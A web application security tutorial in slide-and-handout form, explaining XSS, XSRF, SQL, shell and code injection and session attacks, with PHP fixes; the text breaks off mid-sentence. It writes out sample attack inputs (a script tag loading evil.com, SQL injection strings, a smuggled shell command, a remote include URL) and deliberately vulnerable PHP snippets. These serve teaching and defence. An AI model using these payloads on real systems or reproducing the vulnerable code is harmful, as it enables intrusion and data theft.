   Robust web application security involves many layers -- from the
   operating system, to the web server, to the application code itself.
   This tutorial will look at most common web vulnerabilities
   (cross-site scripting, SQL, code and shell injections, cross-site
   request forgery, session hijacking, session fixation, etc), and offer
   best-practice advice on avoiding them in your web application.

   We will then go through basic stuff that almost everyone gets wrong
   -- password storage, encryption, "mailto forms," file upload,
   installers, etc.

   We will then investigate additional security tools available under
   Linux: SELinux to set up a strict sandbox around your webserver,
   mod_suPHP to help secure your PHP installations in multi-tenant
   environments, and ModSecurity to help intercept web attacks before
   they even get to your application.

   Basic knowledge of HTTP and Apache is assumed.

Topics not covered
------------------
* Advanced web attacks

  * Clickjacking
  * HTTP header manipulation

* HTML5

  * I don't have much experience with it
  * Hackers are known to be very excited

.. container:: handout

  The field of web application security is very broad, so I
  intentionally leave significant chunks out of this tutorial. We won't
  go into things like HTTP header manipulation (response/request
  splitting), clickjacking, and we will steer clear of many advanced
  areas of HTML5 -- primarily because I've exited the web programming
  field since it became the hot new thing and therefore have limited
  familiarity with it.

Who am I?
---------
.. class:: incremental

* Web programmer since 1995

  * PHP since 1998
  * Lead for mcgill.ca web group

* Linux administrator since 1998

  * Duke University Physics (birthplace of ``yum``)
  * Linux Foundation IT team

* Senior IT Security Analyst at McGill

  * Web and Linux security
  * Social engineering

.. container:: handout

  So, what are my "street creds?" Should you be taking my words for
  gospel truth?

  I started web programming in 1995, back in the days when perl CGIs
  were the only way to get anything done. My first extensive work was
  done in college using mostly ASP and VBScript (hey, I was young and I
  needed the money). In 1998 I picked up Linux and PHP in an effort to
  save some money for the non-profit where I worked.

  My first large open-source project was Squirrelmail, for which I wrote
  a number of modules. In 2002 one of them was found to be vulnerable to
  a code injection attack, which rather forcefully introduced me to
  bugtraq mailing lists. The resulting painful embarrassment prompted me
  to learn all I could about secure programming practices.

  I worked as a systems administrator at Duke University Physics, mostly
  known as the birthplace of YUM and the early cradle of Fedora Extras
  Project -- both thanks to efforts of the late Seth Vidal. After moving
  to Montreal, I worked as a web programmer and systems administrator at
  McGill University Web Service Group.

  In mid-2009 I switched tracks and joined the InfoSec group at McGill
  University in the position of a Senior IT Security Analyst. I
  specialized in Linux and web security -- that is, when not forced
  to deal with clueless users who respond to phishing emails.

  In late 2011 I joined the Linux Foundation as part of the
  Collaborative Projects IT team. Our team's duties include supporting
  large collaborative environment sites such as kernel.org,
  codeaurora.org, opendaylight.org, and many others.

  But the most important thing that you should know about me, is that
  I am made out of meat.


Why multiple layers

  We're all made of meat
    If you haven't seen the `short film`_, or read the `short story`_ by
    Terry Bisson that I'm referring to, you really should. Nobody is
    infallible -- nobody can come up with an absolutely perfect and
    infallible security system that will safeguard your website from all
    possible attacks, while not affecting usability in any way.

    Even if someone does come up with such an awesome system, someone
    else later on will make a small error in configuration that will
    render it ineffective, or your boss will demand that you disable
    your two-factor authentication mechanism because someone important
    can't be bothered.

    As well, be prepared that there's meat out there that is either more
    clever than you, or has lots more time and patience on its hands
    than you do.

    .. _`short story`: http://www.terrybisson.com/page6/page6.html

  Fail gracefully
    One of the main tenets of any kind of security -- information or
    physical -- is the concept of failing gracefully. Have more than one
    line of security. Visualize it as a castle that you must protect
    from raging hordes of barbarians. You won't just put up a wall. You
    will probably have a moat, a drawbridge, turrets with arrowslits,
    and sharks with freaking laser beams attached to their heads -- if
    you are evil enough.

    Same goes for IT security. Don't just set up iptables -- add router
    ACLs, have privileged and unprivileged users, set up application
    firewalls, and leave SELinux enabled -- again, if you are evil
    enough.

  Do risk-benefit analysis
    All that said, it is important to exercise sound judgement when it
    comes to deciding how many layers of security you are going to
    bother with. It's one thing if you are entrusted with protecting a
    digital version of Fort Knox, and it's completely another thing if
    you are just setting up a small "web presence" site for your
    neighbourhood muffin shop.

    Each security layer you add will bring with it drawbacks in
    usability, flexibility and perhaps even stability -- depending on
    the tools you pick. Do clearly identify what assets you are trying
    to protect and then perform a simple exercise of "worth it -- not
    worth it" when you pick your security technologies.

  "We don't do money"
    Even if your site will not handle any financial transactions, that
    doesn't mean you shouldn't bother about security.

    Embarrassment is money
      Having the site defaced will cause no end of embarrassment to you
      whether you are the owner of the business or simply the person who
      set up Drupal for them. Trust is very hard to acquire and very
      easy to lose -- guard it well.

    Liability is money
      This is often the case for universities or other environments that
      are subject to government regulations. If your student, patient or
      political donor list is somehow made available to third parties
      not privy to such information, you will be in violation of various
      privacy laws and may either be fined, jailed, or will have to
      spend time end effort in order to jump through all the compliance
      loops.

    Feds taking your servers is money
      Compromised web servers are routinely used to attack other sites
      or to host illegal content. If the attacks were bad enough, or if
      the content was illegal enough -- you will be running the risk of
      having your servers confiscated by authorities for various
      forensic purposes. This will affect downtime, employee time, and
      your good sleep time. All of that will cost you money.

  Lastly, the popular saying in the infosec world is that there are two
  kinds of companies, those that know they've been hacked, and those
  that don't. Don't get cocky. Remember, you're made out of meat.


Generic vulnerabilities
-----------------------
.. class:: incremental

* Cross-site violations

  * XSS, XSRF

* Code injections

  * SQL, Shell, Code injections

* Cookie manipulation

  * Privilege escalation
  * Session theft

.. container:: handout

  In the next few slides we will look at each of the above in more
  detail.


Cross-site scripting
--------------------
:What: Executing arbitrary scripts
:How:  Displaying user input on page
:Fix:  Filter out all HTML

.. container:: handout

  Cross-Site Scripting, which was initially abbreviated as "CSS," but is
  now almost universally abbreviated as "XSS" due to acronym collision
  with "Cascading Style Sheets," is one of the original web exploits
  that first made everyone wake up to the dangers of allowing unfiltered
  user-provided input to be displayed on their web pages. If you were
  using the web some time back in mid-90s, you probably know that every
  website -- ever -- had to have these three essential components:

  * Visitor counter
  * Guestbook
  * Contact form

  Not to mention lens flares, rainbow page dividers, and at least 20
  animated gifs, but these are beyond our scope. Most of the above had
  the following vulnerabilities:

  * Visitor counter: SQL or code injection
  * Guestbook: XSS or SQL injection (or anything, really)
  * Contact form: Spamming

  We'll talk more about Contact forms further on.


XSS: What
---------
.. code-block:: html

  <form>
    What is your name? <input name="name"/>
    <input type="submit"/>
  </form>

.. code-block:: php

  <?php
    echo "Hello, {$_REQUEST['name']}";?>

.. container:: handout

  Here's the example of offensive code. The remarkable thing about this
  example is that it's similar to what most "Learn PHP in 24 hours"
  books used to have somewhere around chapter 2 under "now let's write
  your first interactive PHP application."


XSS: How
--------
.. class:: incremental

* <script src="http://evil.com/evil.js"></script>

  .. class:: incremental

  * Read or write cookies
  * Execute commands
  * Propagate malware
  * Modify content

* Persistent vs. non-persistent


.. container:: handout

  Classic exploit for this vulnerability is invoking a "script src"
  attack, which will instruct the browser to download a javascript file
  from evil.com and execute it. In that script, an attacker can:

  Read or write cookies
    Being able to read the cookies from your domain opens you up for
    vulnerabilities such as session hijacking or other information
    leakage. The attacker can also write cookies -- depending on your
    application this can lead to things such as, for example, privilege
    escalation.

  Execute commands
    Since the script is loaded from a page in your domain, the browser
    will give that script full access to all objects associated with
    your domain. If your domain was added to the browser's "trusted
    sites," that means that the attacker's script will be given greater
    access to the browser's resources (so-called "cross-zone scripting,"
    which some consider a separate type of vulnerability, but is really
    just one of the effects of XSS).

  Propagate malware
    The attacker can use browser or plugin vulnerabilities to infect
    client systems with malware. In fact, in my experience this is the
    most common result of XSS vulnerabilities -- they are used as a
    "toehold" to perform further attacks against client systems.

  Modify content
    This can be used, for example, as part of a social engineering
    attack. An attacker could use XSS against a victim to add the
    attacker's name to a "new faces in IT" webpage, making the victim
    believe that the attacker is employed by the company. Most commonly,
    though, content modification is used to troll the company on reddit.

  XSS can be either persistent or non-persistent. If the content
  containing the XSS is saved in a database and then served to the
  victim without any further actions from the attacker, this is called
  "persistent XSS." The example can be a guestbook application or a
  forum message. Non-persistent attacks require that the victim clicks
  on a carefully crafted URL from some third-party source, like in an
  email message or on another site.


XSS: Fix
--------
.. sidebar:: Clever quote

  Some people, when confronted with a problem, think "I know, Iâll use
  regular expressions." Now they have two problems. --jwz

.. class:: incremental

* encode all user content
* strip all tags

  * and then encode the results

* cast all integers

* don't try to "filter out bad html"

  * especially with regular expressions
  * unless you really, *really* know what you're doing

* if you do filter, store unfiltered and filter on output

  * or re-filter all your content whenever filter is updated


.. container:: handout

  Dealing with XSS is simple if you do not need to allow HTML code in
  the content you receive from the clients. If you are only dealing with
  simple strings or integers, avoiding XSS is extremely easy:

  Encode all user content
    You can escape all HTML using either URL encoding or HTML entity
    encoding (covered in the next slide).

  Strip all tags
    The downside of encoding HTML entities is that if someone tried to
    use HTML for benign purposes (e.g. if they tried to emphasise part
    of their message using <h1>, <b> or <i>), this escaped HTML code
    will look ugly on the resulting page. Common practice is to strip
    all HTML tags. Be careful, though, some HTML can be very complex so
    make sure you strip tags, and *then also encode the result*. This
    will make sure that even if something didn't get stripped correctly,
    at least it just looks ugly and doesn't leave you vulnerable.

  Cast all integers
    Often times you know that something in client input is supposed to
    be an integer. In that case, make sure you cast it to int -- it's
    much faster than stripping tags or encoding.

  If you *do* need to allow *some* HTML, you are in for a world of pain.
  "Filtering out bad HTML" is a very, very, very hard thing to do. Do
  not try it, unless you have no other choice. Especially do not try to
  do it with regular expressions -- they are simply not well-suited to
  the task. It can be done, but your code will look like a wall of ASCII
  soup.

  The trouble with trying to "filter bad html" is that there are many,
  many ways to sneak in malicious content in otherwise
  inconspicuous-looking HTML code. There are pitfalls like UTF-7
  encoding, entity-encoding, url-encoding, etc. Then there is Internet
  Explorer, whose goal in life appears to be to try and execute
  anything that may possibly be executable code.

  There is a number of projects out there that do a fairly good job at
  HTML filtering. I wrote one back in 2004 for Squirrelmail, but I
  haven't really maintained it since 2005 because I ended up rewriting
  it mostly from scratch in 2006 as part of the McGill's website. My
  solution was to use HTML tidy first, to make sure that I was always
  dealing with valid XML, and *then* try to clean it up. Still, the
  resulting code was over 2500 lines of PHP.

  If you do end up going the route of filtering out bad HTML, don't try
  to reinvent the wheel and just use one of the available libraries.
  Chances are, they have already done a better job than you could from
  scratch. Because such filters are always found vulnerable to one thing
  or the other, a laudable approach is to save HTML-containing content
  in the database unfiltered, and filter on output, to make sure that
  even if a previous version of the filter didn't catch some exploit,
  the latest version will. This, of course, is pretty
  computationally-heavy, so you will need to use some sort of caching
  mechanism (which your app probably does anyway). Another approach is
  to re-filter all of the content whenever you adjust the filtering
  code, to make sure that there is no malicious content left over from
  the previous, vulnerable version of the filter.

PHP: Encode all tags
--------------------
* Encode <,>,&,",'

  * Entities: &lt;, &gt;, &amp;, &quot;, &apos
  * URL-encoded: %3C, %3E, %26, %22, %27

* Be aware of UTF-7 and other codepages

  * "<b>" in UTF-7 is "+ADw-b+AD4"
  * Use security libraries provided by your environment

.. code-block:: php

  <?php
    echo "Hello, " . htmlspecialchars($_GET['name']);?>

.. container:: handout

  Let's look at concrete examples. To make your content impervious to
  XSS, it is sufficient to encode the above 5 characters into either
  HTML entities (suitable when content is output as part of the HTML
  page), or as URL-encoded values (suitable when content is output as
  part of a HTML tag.

  You have to be painfully aware of various encoding techniques that can
  mask the characters inside other codepages, such as UTF-7. For some
  reason, Internet Explorer *LOVES* UTF-7, though it is pretty tricky to
  get it to automatically switch codepages (UTF-7 content must come
  early enough in the page content). Use security libraries provided by
  your programming environment instead of manually encoding the strings.
  For example, use ``htmlspecialchars()`` in PHP.


PHP: Strip all tags
-------------------
* Good:

.. code-block:: php

  <?php
    echo "Hello, " . strip_tags($_GET['name']);?>

* Bad:

.. code-block:: php

  <?php
    echo "Hello, " . strip_tags($_GET['name'], '<i>');?>

.. container:: handout

  If you want to strip tags in PHP, you can use the ``strip_tags()``
  function, with a very large caveat -- do *NOT* use the second
  argument, which allows you to "list allowed tags." PHP will not do
  anything about additional parameters passed along these tags, and
  malicious content can be passed by the attacker inside "style" or
  "onmouseover" parameters, among many others.


Cross-site request forgery
--------------------------
:What: Execute code with victim's privileges
:How:  Cross-domain GET/POST requests
:Fix:  Unique keys for all requests

.. container:: handout

  Let's look at Cross-Site Request forgeries, commonly known by the
  abbreviation "XSRF" or "CSRF".


XSRF: What
----------
.. class:: incremental

* Victim logs in to mybank.com and doesn't log out
* Victim visits evil.com

  * ``<img src="mybank.com/xfer?to=attacker&sum=1000">``

* Victim transfers money to the attacker

  * Or, victim grants attacker access rights
  * Or, victim adds "goats" to their interests

.. container:: handout

  In security circles this attack category is known as "Confused Deputy"
  attack. The general idea is that you trick someone into performing a
  malicious action without the "confused deputy" realizing that they are
  doing anything wrong.

  In the case of XSRF, the "confused deputy" is actually the browser and
  not the victim. Here's a common scenario:

  Victim logs in to mybank.com and doesn't log out
    This is an extremely common scenario. If I poll the people in this
    audience, the majority of you will probably have active sessions to
    a number of high-profile sites. An active session doesn't require
    that you have the site open in your browser -- it's enough that you
    still have a "session cookie" that is kept until you actually quit
    the browser (I believe the only time someone closes a browser these
    days is when it crashes).

  Victim visits evil.com
    A malicious site (which is usually not obviously malicious -- simply
    a site that was compromised prior to the attack) can then use a
    number of ways to send GET/POST requests to the site from which you
    never logged out and where you still have an active non-expired
    session (more on this later). If it's a GET request they are after,
    it's easily accomplished by including an <img> tag with all the
    request parameters in the URL of the fake image. If it's a POST
    request, then it's only slightly more complicated -- the attackers
    can either have a hidden form, auto-submitted by a script, or they
    can open a ``XMLHttpRequest()`` to the victim site, especially if it
    makes use of AJAX.

    The attackers can either guess which websites you frequent, or they
    can use the much-maligned ":visited" property of hyperlinks to
    figure out which sites you have visited in the past, and where you
    are likely to have an active session.

  The end-result is that the browser sends a HTTP request to the victim
  site (such as your banking application), with instructions to transfer
  money to the attacker. Or they substitute the victim's email address
  in the site's records and then fire a "password change" request. The
  site then dutifully sends the new password to the attacker's email
  address.

  When XSRF vulnerabilities were still new and poorly understood, one
  was successfully used against Gmail to set up a filter in the victim's
  settings that would forward all email matching the words "username" or
  "password" to the attacker. You can imagine the consequences of this
  on your own, I'm sure.


XSRF: How
---------
.. class:: incremental

* Users don't log out
* Session time-outs too long
* Users have tab-induced ADD
* Users expect that closing a tab is the same as closing the browser
* Recent mac converts have trouble grokking â-Q

.. container:: handout

  So, how come this attack is effective?

  Users don't log out
    This is demonstrably true, just look at your own browsing habits.
    Very few people realize the importance of clicking on the "Log Out"
    button, and few sites make it prominently seen in their UI.

  Session time-outs are too long
    Many sites do not implement a "session time-out," or if they do,
    it's set to a long period of time to make sure that they don't
    interfere with client's legitimate activity that can take a while to
    finish (such as, for example, composing a message). If you make the
    time-out too short, there's a chance that clients will have poor
    experience with your application as the work they have laboured to
    complete is lost due to an expired session.

  Users have tab-induced ADD
    A way to solve the previous problem is to implement a "client is
    still here" ping from the website page using javascript -- just to
    make sure that a client's session doesn't expire while they have the
    actual site page open in the browser. The assumption is that if the
    client has an actual page open in the browser, they are working on
    something that may take a long time (e.g. composing a message).
    However, with the advent of tabbed browsing, the real result is that
    sessions never expire because people don't bother to close tabs.

  Users expect that closing a tab is the same as closing the browser
    Some sites state in bold letters that in order to avoid potential
    security problems, the user must exit the browser at the end of the
    session. Most users have trouble distinguishing "closing the
    browser" from "closing the tab." The problem is even worse on Macs
    and mobile platforms, where closing all windows doesn't actually
    exit the application.


XSRF: Fix
---------
.. class:: incremental

* Requests coming from authenticated users must be given just as much
  scrutiny as all other requests.
* Include "XSRF tokens" in all your forms
* Do not rely on "Referrer"

  * Can be spoofed or blanked out

* Requiring POST will help, but is not sufficient
* You can verify all "drastic" actions

  * Is saying "I like goats" drastic?
  * Beware of "Just click yes" effect


.. container:: handout

  The main mantra to repeat to yourself when it comes to user content
  is: "never trust user content, even if it came from authenticated
  users." It may make logical sense to be more lax with content you
  receive from authenticated "trusted" users, but always remember that
  anything you receive from the browser may not have come from your
  trusted user, despite being part of their authenticated session.

  There is no simple fix for XSRF -- the only sure-way to prevent XSRF
  attacks is to include unique and random tokens in all the forms on
  your site, and to check them whenever you process content submitted
  from the users. Make sure the tokens are random, and not merely unique
  and guessable -- some examples I've seen on the net use md5sums of
  timestamps, which are trivially guessable.

  Do not rely on "Referrer"
    You can cheat by checking "HTTP_REFERER" to make sure that the
    originating request comes from your own site and not from a
    3rd-party site. At best, you can use it as a stop-gap measure,
    because HTTP_REFERER is not reliable:

    * HTTP_REFERER can be blanked out by the user's privacy tools, or by
      the company's privacy-enforcing proxy
    * HTTP_REFERER can be spoofed and has been in the past via Adobe
      Flash

  Requiring "POST" helps very little
    Some sites will recommend using POST for all requests that result in
    data modification, and GET when data is only being read. This has
    limited impact in the context of XSRF -- attackers are usually
    capable of issuing POST requests, though it is harder than just
    including an "img src" in a site somewhere or sending the victim a
    carefully crafted link in an email.

  You can verify all "drastic" actions
    An effective approach to avoid XSRF attacks is to always present an
    "Are you sure?" page responding to client's actions that are
    "drastic," such as wiring money, changing email settings, etc.
    However, the downside of this approach is a so-called "Just click
    yes effect" -- asking the client to verify too many actions will be
    perceived as a usability blemish and may turn off people from your
    application, or condition them to always click "yes."


PHP: XSRF token example
-----------------------
.. code-block:: php

  <?php
    $token = mt_rand(); // or something stronger
    $_SESSION['xsrf_tokens']['myform'] = $token;
    echo '<input type="hidden" name="xsrf_token"
          value="' . $token .  '"/>';
    // ... when processing form submission ...
    $ses_token = $_SESSION['xsrf_tokens']['myform'];
    if ($_POST['xsrf_token'] == $ses_token) {
        // perform action
    }?>

.. container:: handout

  This is a quick PHP example of creating and checking XSRF tokens. They
  need to be unique per form, not just per user session, and each form
  should only allow one value -- the latest generated. This has some
  usability downsides, e.g. a user may open the same form in two tabs
  and try to submit the one they had opened first, but any other
  solutions are not as safe.


SQL Injection
-------------
:What: Execute SQL commands
:How:  Malicious user input
:Fix:  Filter user input

.. container:: handout

  SQL injections are one of the most damaging attacks and have been used
  to steal confidential information from high-profile sites, including
  passwords and credit card data.

SQL Injection: What
-------------------
.. class:: incremental

* Access to back-end database

  * Delete records
  * Modify records
  * Obtain records

    .. class:: incremental

    * Credit card numbers
    * Account credentials

.. container:: handout

  All interactive sites have some kind of a database on the back-end --
  probably a relational DB using SQL. In fact, any website application
  ultimately does one of two things: store client input, or present
  client with data based on client input.

  Client input is ultimately used inside SQL expressions. If client
  input is not properly sanitized, an attacker can execute arbitrary SQL
  expressions in order to delete records, modify records, or obtain
  records and display them on the page. Such records can contain
  confidential information, such as credit card numbers or account
  credentials.


SQL Injection: How
------------------
.. class:: incremental

* ``SELECT * FROM stuff WHERE data='{input}'``

  .. class:: incremental

  * ``'; DROP DATABASE; --``
  * ``' OR ''='``
  * ``' UNION SELECT * FROM accounts WHERE ''='``

* O'Malley's Pub 'n Grill

.. container:: handout

  This is a quick example of how it's done. You can use your imagination
  to figure out what the example malicious input will accomplish.

  Most commonly, problematic SQL is discovered when someone tries to
  look up for a benign string containing single quotes.


SQL Injection: Fix
------------------
.. class:: incremental

* Use parametrized statements
* Use escaping routines if you must

  * Don't write your own
  * Cast your integers

* Have multiple db users

  * Read-only user
  * Read-write user
  * Read-write to admin fields user

.. container:: handout

  SQL injection vulnerabilities are really easy to avoid, which makes it
  ever more frustrating that it's been well over a decade since "SQL
  Injections" were new hat and it's still easily half of all reported
  web application vulnerabilities.

  Use parametrized statements
    The best way to avoid SQL injections is to always use parametrized
    statements or stored procedures. All sane databases and development
    environments support them, so it's mind-boggling that developers
    still concatenate strings to make SQL queries.

  Use escaping routines if you absolutely must
    If there is a really good, sane reason why you prefer not to use a
    parametrized statement and need to stick user-provided content into
    an SQL string, please use escaping routines provided by your
    programming environment. Don't write your own, because you may miss
    something specific to your database. If the client input should be
    integers, then cast them.

  Have multiple db users
    Remember the layered approach and the principle of the least
    privilege -- have separate database user accounts for performing
    read-only operations, read-write operations, and admin-level
    database operations. There are downsides to this approach -- it
    multiples the number of database connections per each request and
    most third-party software doesn't support this separation. At the
    very least, don't ``GRANT ALL PRIVILEGES`` to the account used by
    your web application.


PHP: SQL Injection
------------------
.. code-block:: html

  <form method="GET">
    Search: <input name="query"/>
  </form>

.. code-block:: php

  <?php
    $sql = "SELECT FROM stuff
            WHERE data = '{$_GET['query']}'";
    pg_query($sql);?>

.. container:: handout

  This is a quick example of code vulnerable to the SQL injection
  attack. It could be found nearly verbatim in most "Teach yourself PHP"
  books of the early days.


PHP: SQL Injection fix
----------------------

.. code-block:: php

  <?php
    $sql = "SELECT FROM stuff
             WHERE data = ?";
    $dbh = new PDO('...');
    $sth = $dbh->prepare($sql);
    $sth->execute($_GET['query']);?>

.. container:: handout

  Using a parametrized statement instead will avoid the problem.


Shell Injection
---------------
:What:   Execute shell commands
:How:    Malicious user input
:Fix:    Filter user input
:Better: Don't execute shell commands

.. container:: handout

  Every now and again a developer feels inclined to open a shell in
  order to execute another command. When done improperly, this can lead
  to shell code injections.


Shell Injection: What
---------------------
.. class:: incremental

* Any site visitor can execute commands with httpd daemon's privileges
* System will likely be used:

  * To send spam
  * To attack other computers
  * As a proxy to carry out other attacks against your network

.. container:: handout

  Shell injection vulnerabilities tend to be viewed lightly because "the
  web server is running as an unprivileged process anyway." This is
  folly, because anyone who has shell access to your server can readily
  exploit other vulnerabilities in your applications in order to obtain
  elevated privileges. Even if they don't, and they are restricted to
  running commands as user "nobody," they can still do a lot of damage
  by sending out spam, attacking other computers on the net, or using
  this toehold on your network to plan other attacks against more
  interesting targets (a.k.a. network pivoting).


Shell Injection: How
--------------------
* Apache script passes parameters to a command-line utility

.. code-block:: php

  <?php
    $cmd = '/opt/bin/search ' . $_GET['query'];?>

* Attacker puts in:

  * ``foo; "ENLARGE!" | mail -s "ENLARGE!" victim@...``


.. container:: handout

  Back in the days when ht://Dig was the sole free roll-your-own-search
  solution on the block, the way to make it work from scripts was to
  invoke it via an ``exec()`` call, passing user-input as command-line
  parameters. When not done correctly (see above example), this left the
  system vulnerable to shell injection attacks via search queries.


Shell injection: Fix
--------------------
.. class:: incremental

* You're probably doing something wrong
* If you must, filter out user input:

  * Shell-specific
  * Cast integers
  * Replace anything that is not a character

    * Be painfully aware of Unicode

* JUST SAY NO

.. container:: handout

  Before we talk about how to fix the problem, ask yourself whether
  you're going about it the right way. The rule of thumb is -- if you
  are trying to ``exec()`` an external command, you are probably doing
  something wrong. There are better ways of doing it -- such as using a
  library.

  If you absolutely must (no library exists, or absolutely no other way
  of making it work, or absolutely out of time and must have it working
  -- hey, I've been there :)), you must filter user input. The filtering
  rules are shell-specific, but usually it is sufficient to escape all
  single quotes and wrap the content you will be passing as command-line
  arguments into single quotes. Cast anything that should be an integer.
  To be sure, replace anything that is not a character or a digit (if
  you can). Be aware of Unicode and all its permutations.

  In other words, really, really re-evaluate whether you want to do it
  this way. This is very hard to get right, and reveals very intimate
  parts of your server to attackers.


PHP: Shell injection fix
------------------------
* Use ``escapeshellarg()`` function:

.. code-block:: php

  <?php
    $cmd = '/opt/bin/search '
         . escapeshellarg($_GET['query']);?>

.. container:: handout

  This should help secure your ``exec()`` call.


Code injection
--------------
:What:  Execute arbitrary code as part of your application
:How:   Malicious user input
:Fix:   Be very careful with user input

.. container:: handout

  While all of the above categories involve executing attacker's
  malicious code in one way or another, this section talks about
  executing attacker's code as part of your main web application.


Code injection: How
-------------------
.. class:: incremental

* Templates!
* Using ``eval()`` on user input
* Using ``unserialize()`` on user input
* Using ``include()`` with user input

  * Especially if ``include()`` allows remote content

* Putting uploaded files in web root

.. container:: handout

  Templates!
    A surprising number of templating engines work by using some kind of
    markup language that gets replaced by PHP code and then
    eval()-uated. Of course, if the page includes unfiltered code that
    comes from the client, this will happily execute that code as well.

  Using eval() on any user input
    Same as above, though not necessarily through templates. Many
    applications, when they grow big enough, will include some sort of
    meta-programming language for the "power-users" that is unfailingly
    implemented via a bit of regex magic and an ``eval()`` on resulting
    code. While this can be done safely, it very rarely is.

  Using unserialize() on user input
    This is largely PHP-specific, but I couldn't find a better place to
    put it. A lot of time programmers take shortcuts by serializing an
    object into a string, encoding it in base64, and outputting it on a
    page as a hidden form element -- for example as a way to avoid using
    the database to pass data along in multi-page forms. The trouble is,
    that string can be spiked by attackers to override your core objects
    or even trigger overflows in core PHP.

  Using include() with user input
    I will demonstrate this with an example further.

  Putting uploaded files in web root
    A no-brainer, but occurs routinely because uploading files and
    images that must be internet-accessible is a very common feature
    request. If these files aren't strictly checked against a rigid set
    of rules with regard to their mime-type and file extension,
    attackers may upload executable content and execute it via the web.


Code injection: Fix
-------------------
.. class:: incremental

* Don't use templates that work via ``eval()``

  * Or use same strategy as with XSS

* Remember that ``unserialize()`` is unsafe
* Disallow ``include()``-ing remote content

  * Turn off ``allow_url_fopen`` and ``allow_url_include`` in PHP

* Be careful about file uploads

  * Check file names
  * Do not place uploaded files into web root

.. container:: handout

  So, don't ``eval()`` user content, or if you must do it for some
  reason, treat it the same as you treat content that is rife with XSS.
  Remember the mantra I already mentioned earlier: just because it came
  from an authorized user, doesn't mean the user authorized it.

  In PHP, don't ``unserialize()`` content coming from user input, and
  turn off remote includes in ``php.ini``. If you must do something like
  that, JSON is much safer than native serialization.

  Be very careful with uploaded files. Always check filenames and don't
  put these files in the web root if you can avoid it.


PHP: Code Injection
-------------------
.. code-block:: html

  <a href="page.php?p=about">About us</a>

.. code-block:: php

  <?php
    doHeader();
    include("{$_GET['p']}.php");
    doFooter();?>

* ``p=http://evil.com/exploit.php?``

.. container:: handout

  This code is almost verbatim from a compromised website that I had to
  post-mortem while at McGill. The solution here would be not to use
  direct user input, or always check it against a list of valid values.


Cookie theft
------------
:What: Session manipulation, data leaks
:How:  XSS or HTTP TRACE
:Fix:  Filter out XSS, turn off HTTP TRACE

.. container:: handout

  Let's talk about what happens when a victim's cookies can be accessed
  or manipulated by attackers. Usually this is accomplished as a result
  of XSS or HTTP TRACE (more on that later).


Cookies: Session hijacking
--------------------------
.. class:: incremental

* Session identifier is stored in a cookie
* If an attacker knows your session identifier, they can assume your
  identity for the duration of the session

  * Authentication bypass
  * Privilege escalation

.. container:: handout

  When it comes to cookie theft, most commonly what the attackers want
  are "session cookies" -- unique random identifiers used by web
  applications to tie incoming http requests to existing sessions. HTTP
  is a stateless protocol, so this is really the only way to reliably
  identify the same client across multiple requests.

  The trouble is, if another person knows what this identifier is, they
  can then dupe the webserver and take over the victim's session -- with
  all the permissions and credentials of the victim. In infosec-speak,
  this is called "authentication bypass" and "privilege escalation."


Cookies: Session Hijacking fix
------------------------------
.. class:: incremental

* Make sure session identifiers are random
* Never pass session IDs in URLs
* Use secure cookies
* Restrict path/domain
* Use ``httponly`` cookies

  * HTTP-only cookies can't be accessed via Javascript

* Disable ``HTTP TRACE`` on your server
* Avoid using ``REMOTE_IP`` or ``USER_AGENT``

.. container:: handout

  Make sure session identifiers are random
    Session identifiers are no good if they can be guessed. Use the
    session identifiers created by your environment, don't roll your
    own. If you do roll your own, make sure they are random and not
    simply incrementing integers, md5sums of guessable data, or
    timestamps.

  Never pass session IDs in URLs
    Periodically popular sites publish articles about privacy and
    security online. They are usually extremely simplified to the point
    of recommending turning off cookies altogether. Back about a decade
    ago "cookies are bad, mkay" notion was so prevalent that developers
    started looking for alternative ways of passing session identifiers.
    Thus ``?PHPSESSID=`` was born.

    The trouble is, URL information is leaked trivially via
    HTTP_REFERER, screenshots, links pasted in online forums, etc. Turn
    it off in php.ini, and never pass session identifiers in URLs.

  Use secure cookies
    Cookies can be marked as "secure-only," meaning that they will only
    be submitted in HTTP requests over SSL connections. Use this option.

  Restrict path/domain
    If your application is in a subdomain, don't up-level unless you
    absolutely need to. Don't forget about the ``path`` parameter, too,
    especially if your app is not in the root. Don't expose your cookies
    more than you need to.

  Mark your cookies "httponly"
    This is a late addition to the cookie standard, but nearly all
    browsers support this functionality these days. Cookies marked as
    "http-only" are not accessible via javascript, thus making session
    hijacking via XSS impossible. This feature is awesome -- use it!

  Disable HTTP_TRACE on your server
    Even with http-only cookies, there remains a way for attackers to
    get to them, and that is via the "HTTP TRACE" functionality on the
    webserver. "HTTP TRACE" is part of the HTTP standard and by default
    Apache will honour it. In a few words, HTTP TRACE will echo back all
    headers sent in the HTTP transaction, including any Cookie: headers.

    The attacker has to be pretty crafty to achieve it, and your website
    has to have wide enough XSS holes to drive a truck through them, but
    if you want to be thorough guarding your session cookies, turn off
    HTTP TRACE support in production sites. Check the Apache docs to see
    how to do it.

  Avoid using ``REMOTE_IP`` or ``USER_AGENT``
    It is tempting to tie session cookies to the client's remote IP, or
    to the USER_AGENT. USER_AGENT shouldn't really be used, because it
    can be easily spoofed by the attacker. You can use REMOTE_IP to your
    advantage, but do it with care, as legitimate clients can change IP
    addresses in the middle of a session if they use large ISPs or if
    your boss decides to connect to the VPN in the middle of filling out
    a requisition form.


Cookies: Session fixation
-------------------------
.. class:: incremental

* Session hijacking "in reverse"
* Attacker establishes a session and forces it onto victim

  * usually by making the victim click on a link

* The victim authenticates

  * the attacker has authenticated session


.. container:: handout

  Session fixation is like session hijacking in reverse. When developers
  wised up a bit and it became too difficult to hijack sessions,
  attackers started exploiting the fact that frequently you can force a
  session identifier onto someone else. The end-result is the same as
  session hijacking.

  Attacker usually establishes a session first by visiting a site. Then
  they read the session cookie and trick the victim into assuming that
  session, for example by clicking a link that contains a
  ``?PHPSESSID=`` parameter. If the web application does not make sure
  that session identifiers only come from secure cookies, the victim
  will continue the attacker's session. Usually the victim then
  authenticates to the application, and the attacker takes over the
  session again with victim's permissions.


Cookies: Session fixation fix
-----------------------------
.. class:: incremental

* Re-initialize the session after authentication
* Never accept session identifiers in GET/POST

.. container:: handout

  The way to avoid this is to make sure that you never accept session
  identifiers in GET/POST, only in secure cookies. For the case of PHP,
  this means NEVER using `$_REQUEST` and always using `$_COOKIE`.

  Additionally, you can re-initialize the session identifiers after
  authentication, just to make sure that the identifier is always reset
  to a new random value.


AWOOGA features
---------------
* Encryption
* Password storage
* Forgotten password resets
* Email from site
* File uploads
* Templating
* Search
* Installers

.. container:: handout

  Now that we've covered the major attack vectors that can be used
  against your web application, let's talk about web app
  features that require extra scrutiny because they are routinely
